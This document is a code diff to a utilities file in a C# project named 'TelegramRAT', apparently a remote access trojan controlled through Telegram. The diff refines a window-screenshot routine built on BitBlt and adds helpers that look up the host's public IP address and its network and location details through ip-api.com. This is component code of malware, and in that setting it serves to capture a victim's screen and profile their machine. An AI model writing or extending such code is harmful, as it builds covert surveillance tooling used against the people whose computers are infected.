@@ -1,5 +1,9 @@
 ﻿using Microsoft.Win32;
 using System.Drawing;
+using System.Net.Http;
+using System.Xml.Serialization;
+using TelegramRAT.Features;
+using System.IO;
 
 namespace TelegramRAT.Utilities;
 
@@ -9,12 +13,10 @@ static class Utils
     {
         WinAPI.GetClientRect(hWnd, out Rectangle windowbounds);
 
-        Bitmap windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
-
-        Graphics wndGraphics = Graphics.FromImage(windowCap);
+        using Bitmap windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
+        using Graphics wndGraphics = Graphics.FromImage(windowCap);
 
         IntPtr graphicsDc = wndGraphics.GetHdc();
-
         IntPtr windowDc = WinAPI.GetDC(hWnd);
 
         WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);
@@ -26,10 +28,18 @@ static class Utils
 
     public static async Task<string> GetIpAddressAsync()
     {
-        HttpClient client = new HttpClient();
-        string ip = await client.GetStringAsync("https://api.ipify.org/?format=json");
-        ip = string.Join(string.Empty, ip.Skip(7).SkipLast(2));
-        return ip;
+        using HttpClient client = new HttpClient();
+        string ip = await client.GetStringAsync("https://api.ipify.org");
+        return ip.Trim();
+    }
+
+    public static async Task<NetworkInfo?> GetNetworkInfoAsync()
+    {
+        using HttpClient client = new HttpClient();
+        string xml = await client.GetStringAsync("https://ip-api.com/xml");
+        XmlSerializer serializer = new(typeof(NetworkInfo));
+        using StringReader reader = new(xml);
+        return serializer.Deserialize(reader) as NetworkInfo;
     }
 
     public static string GetWindowsVersion()
